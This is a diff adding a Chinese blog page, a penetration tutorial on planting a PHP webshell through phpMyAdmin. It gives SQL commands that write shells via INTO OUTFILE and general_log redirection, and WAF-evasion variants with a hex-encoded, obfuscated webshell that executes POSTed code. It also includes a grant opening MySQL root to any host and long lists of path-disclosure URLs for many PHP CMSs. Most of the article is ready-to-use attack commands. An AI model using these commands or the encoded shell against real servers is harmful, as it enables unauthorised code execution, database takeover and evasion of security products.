@@ -1,0 +1,648 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>web渗透11phpmyadmin写shell的三种方法 | 开发者问答集锦</title>
+    <meta property="og:title" content="web渗透11phpmyadmin写shell的三种方法 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="web渗透11phpmyadmin写shell的三种方法">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/web%E6%B8%97%E9%80%8F11phpmyadmin%E5%86%99shell%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">web渗透11phpmyadmin写shell的三种方法</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            <p>查看phpMyAdmin能否自定义导出文件目录的权限</p>
+
+<pre><code> show global variables like &quot;%secure%&quot;;      //查询secure_file_priv配置
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/0a5fc683f7f347038f4922c8cf1895c5.jpg"><img src="https://img.it610.com/image/info8/0a5fc683f7f347038f4922c8cf1895c5.jpg" alt="web渗透【11】phpmyadmin写shell的三种方法_第1张图片" /></a></p>
+
+<ol>
+<li>secure_file_prive=null //不允许导入导出数据到目录</li>
+<li>secure_file_priv=c:\\www //允许导入导出数据到指定目录</li>
+<li>secure_file_priv=&rdquo; //允许导入导出数据到任意目录</li>
+<li>secure_file_priv=&ldquo;/&rdquo; //允许导入导出数据到任意目录</li>
+</ol>
+
+<p>注：在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为&rdquo;&ldquo;或&rdquo;/&ldquo;，重启MySQL服务！</p>
+
+<hr />
+
+<p>（1）情况一：</p>
+
+<p>导出WebShell主要条件：</p>
+
+<p>1.Root数据库用户（root权限）</p>
+
+<p>2.网站绝对路径（确定有写入权限）</p>
+
+<p>3.magic_quotes_gpc：Off（关闭）</p>
+
+<pre><code>一句话导出shell：
+select '' into outfile 'c:\\phpstudy\\www\\90sec.php';
+</code></pre>
+
+<p>(2)情况二：</p>
+
+<p>1.Root数据库用户（root权限）</p>
+
+<p>2.网站绝对路径（确定有写入权限）</p>
+
+<p>3.magic_quotes_gpc：Off（开启）</p>
+
+<pre><code>创建数据表导出shell
+CREATE TABLE `mysql`.`user1` (`content` TEXT NOT NULL );
+INSERT INTO `mysql`.`user1` (`content` ) VALUES ('');
+SELECT `content` FROM `user1` INTO OUTFILE 'C:\\phpStudy\\WWW\\xxx.php';
+DROP TABLE IF EXISTS `user1`;
+</code></pre>
+
+<p>(3)情况三：（日志备份获取shell）</p>
+
+<p>1.Root数据库用户（root权限）</p>
+
+<p>2.没有写入权限</p>
+
+<p>3.magic_quotes_gpc：Off（关闭）</p>
+
+<pre><code>show global variables like &quot;%genera%&quot;;          //查询general_log配置
+set global general_log='on';              //开启general log模式
+SET global general_log_file='D:/phpStudy/WWW/cmd.php';    //设置日志文件保存路径
+SELECT '';              //phpinfo()写入日志文件
+set global general_log='off';              //关闭general_log模式
+</code></pre>
+
+<p>1、执行第一步后，记住原始的log_file路径，便于以后还原</p>
+
+<p><a href="https://img.it610.com/image/info8/99e24b4d6a6b4903af07927816e5d462.jpg"><img src="https://img.it610.com/image/info8/99e24b4d6a6b4903af07927816e5d462.jpg" alt="web渗透【11】phpmyadmin写shell的三种方法_第2张图片" /></a></p>
+
+<p>2、执行第二，三后，再用show global variables llike &ldquo;%genera&rdquo; 查看更改结果;</p>
+
+<p><a href="https://img.it610.com/image/info8/a6d215527cb549d0bf4c1d2ad4140585.jpg"><img src="https://img.it610.com/image/info8/a6d215527cb549d0bf4c1d2ad4140585.jpg" alt="web渗透【11】phpmyadmin写shell的三种方法_第3张图片" /></a></p>
+
+<p>3、然后进行写php，关闭日志，OK。访问可以看到php被执行。</p>
+
+<p><a href="https://img.it610.com/image/info8/0c7eaa7a51454b1292e5f844cd71bab7.jpg"><img src="https://img.it610.com/image/info8/0c7eaa7a51454b1292e5f844cd71bab7.jpg" alt="web渗透【11】phpmyadmin写shell的三种方法_第4张图片" /></a></p>
+
+<hr />
+
+<p>补充一：</p>
+
+<p>当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截</p>
+
+<pre><code>grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;     //开启MySQL外链
+flush privileges;                      //刷新MySQL系统权限相关表
+</code></pre>
+
+<p>这里的这些技巧是从别人那边收集过来的 感谢！！！</p>
+
+<pre><code>绕过360 （通过内联注释）
+select '' into /*!50001outfile*/ 'c:/phpstudy/www/bypass.php';
+</code></pre>
+
+<p>绕过网站安全狗&lt;4.0 （通过hex编码）</p>
+
+<pre><code>select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
+</code></pre>
+
+<p>绕过安全狗4.0 通过hex编码+内联注释</p>
+
+<pre><code>/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
+</code></pre>
+
+<p>绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell<br />
+以上的三个文件的作用是（执行SQL语句）<br />
+但是如果被删除了可以通过以下的方法</p>
+
+<pre><code>(1)token需要
+(2)自己选择一个数据库和数据表
+(3)参数pos=0
+&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
+
+
+例如 http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
+</code></pre>
+
+<p>————————————————</p>
+
+<p>补充二：</p>
+
+<p>找绝对路劲：</p>
+
+<p>php爆路径方法收集 ：</p>
+
+<p>1、单引号爆路径</p>
+
+<p>说明：</p>
+
+<p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</p>
+
+<p>www.xxx.com/news.php?id=149′</p>
+
+<p>2、错误参数值爆路径</p>
+
+<p>说明：</p>
+
+<p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。</p>
+
+<p>www.xxx.com/researcharchive.php?id=-1</p>
+
+<p>3、Google爆路径</p>
+
+<p>说明：</p>
+
+<p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal
+error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
+
+<p>Site:xxx.edu.tw warning</p>
+
+<p>Site:xxx.com.tw “fatal error”</p>
+
+<p>4、测试文件爆路径</p>
+
+<p>说明：</p>
+
+<p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</p>
+
+<p>www.xxx.com/test.php</p>
+
+<p>www.xxx.com/ceshi.php</p>
+
+<p>www.xxx.com/info.php</p>
+
+<p>www.xxx.com/phpinfo.php</p>
+
+<p>www.xxx.com/php_info.php</p>
+
+<p>www.xxx.com/1.php</p>
+
+<p>5、phpmyadmin爆路径</p>
+
+<p>说明：</p>
+
+<p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</p>
+
+<p>1. /phpmyadmin/libraries/lect_lang.lib.php</p>
+
+<p>2./phpMyAdmin/index.php?lang[]=1</p>
+
+<p>3. /phpMyAdmin/phpinfo.php</p>
+
+<p>4. load_file()</p>
+
+<p>5./phpmyadmin/themes/darkblue_orange/layout.inc.php</p>
+
+<p>6./phpmyadmin/libraries/select_lang.lib.php</p>
+
+<p>7./phpmyadmin/libraries/lect_lang.lib.php</p>
+
+<p>8./phpmyadmin/libraries/mcrypt.lib.php</p>
+
+<p>6、配置文件找路径</p>
+
+<p>说明：</p>
+
+<p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</p>
+
+<p>Windows:</p>
+
+<p>c:\windows\php.ini php配置文件</p>
+
+<p>c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</p>
+
+<p>Linux:</p>
+
+<p>/etc/php.ini php配置文件</p>
+
+<p>/etc/httpd/conf.d/php.conf</p>
+
+<p>/etc/httpd/conf/httpd.conf Apache配置文件</p>
+
+<p>/usr/local/apache/conf/httpd.conf</p>
+
+<p>/usr/local/apache2/conf/httpd.conf</p>
+
+<p>/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</p>
+
+<p>7、nginx文件类型错误解析爆路径</p>
+
+<p>说明：</p>
+
+<p>这是昨天无意中发现的方法，当然要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。</p>
+
+<p>www.xxx.com/top.jpg/x.php</p>
+
+<p>8、其他</p>
+
+<p>dedecms</p>
+
+<p>/member/templets/menulit.php</p>
+
+<p>plus/paycenter/alipay/return_url.php</p>
+
+<p>plus/paycenter/cbpayment/autoreceive.php</p>
+
+<p>paycenter/nps/config_pay_nps.php</p>
+
+<p>plus/task/dede-maketimehtml.php</p>
+
+<p>plus/task/dede-optimize-table.php</p>
+
+<p>plus/task/dede-upcache.php</p>
+
+<p>WP</p>
+
+<p>wp-admin/includes/file.php</p>
+
+<p>wp-content/themes/baiaogu-seo/footer.php</p>
+
+<p>ecshop商城系统暴路径漏洞文件</p>
+
+<p>/api/cron.php</p>
+
+<p>/wap/goods.php</p>
+
+<p>/temp/compiled/ur_here.lbi.php</p>
+
+<p>/temp/compiled/pages.lbi.php</p>
+
+<p>/temp/compiled/user_transaction.dwt.php</p>
+
+<p>/temp/compiled/history.lbi.php</p>
+
+<p>/temp/compiled/page_footer.lbi.php</p>
+
+<p>/temp/compiled/goods.dwt.php</p>
+
+<p>/temp/compiled/user_clips.dwt.php</p>
+
+<p>/temp/compiled/goods_article.lbi.php</p>
+
+<p>/temp/compiled/comments_list.lbi.php</p>
+
+<p>/temp/compiled/recommend_promotion.lbi.php</p>
+
+<p>/temp/compiled/search.dwt.php</p>
+
+<p>/temp/compiled/category_tree.lbi.php</p>
+
+<p>/temp/compiled/user_passport.dwt.php</p>
+
+<p>/temp/compiled/promotion_info.lbi.php</p>
+
+<p>/temp/compiled/user_menu.lbi.php</p>
+
+<p>/temp/compiled/message.dwt.php</p>
+
+<p>/temp/compiled/admin/pagefooter.htm.php</p>
+
+<p>/temp/compiled/admin/page.htm.php</p>
+
+<p>/temp/compiled/admin/start.htm.php</p>
+
+<p>/temp/compiled/admin/goods_search.htm.php</p>
+
+<p>/temp/compiled/admin/index.htm.php</p>
+
+<p>/temp/compiled/admin/order_list.htm.php</p>
+
+<p>/temp/compiled/admin/menu.htm.php</p>
+
+<p>/temp/compiled/admin/login.htm.php</p>
+
+<p>/temp/compiled/admin/message.htm.php</p>
+
+<p>/temp/compiled/admin/goods_list.htm.php</p>
+
+<p>/temp/compiled/admin/pageheader.htm.php</p>
+
+<p>/temp/compiled/admin/top.htm.php</p>
+
+<p>/temp/compiled/top10.lbi.php</p>
+
+<p>/temp/compiled/member_info.lbi.php</p>
+
+<p>/temp/compiled/bought_goods.lbi.php</p>
+
+<p>/temp/compiled/goods_related.lbi.php</p>
+
+<p>/temp/compiled/page_header.lbi.php</p>
+
+<p>/temp/compiled/goods_script.html.php</p>
+
+<p>/temp/compiled/index.dwt.php</p>
+
+<p>/temp/compiled/goods_fittings.lbi.php</p>
+
+<p>/temp/compiled/myship.dwt.php</p>
+
+<p>/temp/compiled/brands.lbi.php</p>
+
+<p>/temp/compiled/help.lbi.php</p>
+
+<p>/temp/compiled/goods_gallery.lbi.php</p>
+
+<p>/temp/compiled/comments.lbi.php</p>
+
+<p>/temp/compiled/myship.lbi.php</p>
+
+<p>/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-
+scripts/spellchecker.php</p>
+
+<p>/includes/modules/cron/auto_manage.php</p>
+
+<p>/includes/modules/cron/ipdel.php</p>
+
+<p>ucenter爆路径</p>
+
+<p>ucenter\control\admin\db.php</p>
+
+<p>DZbbs</p>
+
+<p>manyou/admincp.php?my_suffix=%0A%0DTOBY57</p>
+
+<p>z-blog</p>
+
+<p>admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</p>
+
+<p>php168爆路径</p>
+
+<p>admin/inc/hack/count.php?job=list</p>
+
+<p>admin/inc/hack/search.php?job=getcode</p>
+
+<p>admin/inc/ajax/bencandy.php?job=do</p>
+
+<p>cache/MysqlTime.txt</p>
+
+<p>PHPcms2008-sp4</p>
+
+<p>注册用户登陆后访问</p>
+
+<p>phpcms/corpandresize/process.php?pic=../images/logo.gif</p>
+
+<p>bo-blog</p>
+
+<p>PoC:</p>
+
+<p>/go.php/</p>
+
+<p>CMSeasy爆网站路径漏洞</p>
+
+<p>漏洞出现在menu_top.php这个文件中</p>
+
+<p>lib/mods/celive/menu_top.php</p>
+
+<p>/lib/default/ballot_act.php</p>
+
+<p>lib/default/special_act.php</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
